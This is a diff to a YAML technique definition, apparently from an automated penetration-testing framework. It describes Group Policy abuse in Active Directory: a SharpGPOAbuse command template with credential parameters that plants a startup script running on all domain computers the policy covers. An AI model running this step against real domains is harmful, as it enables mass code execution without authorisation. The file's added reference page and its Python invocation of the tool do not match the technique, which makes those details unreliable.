@@ -2,16 +2,19 @@ name: gpo_abuse
 category: ad
 description: GPO abuse for code execution on domain computers
 preconditions:
-  - domain_joined
-  - has_cred
+- domain_joined
+- has_cred
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "python3 SharpGPOAbuse.py --add-computer-script '{script}' --gpo-id '{gpo_id}' -u '{username}' -p '{password}' -d {domain}"
+command_template: python3 SharpGPOAbuse.py --add-computer-script '{script}' --gpo-id
+  '{gpo_id}' -u '{username}' -p '{password}' -d {domain}
 parser: null
 expected_effects:
-  - action_completed
+- action_completed
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "If you have write access to a GPO, add startup script that executes on all computers where GPO applies. Immediate code execution on next gpupdate."
+mechanism: If you have write access to a GPO, add startup script that executes on
+  all computers where GPO applies. Immediate code execution on next gpupdate.
+hacktricks_ref: network-services-pentesting/pentesting-web/special-http-headers.md
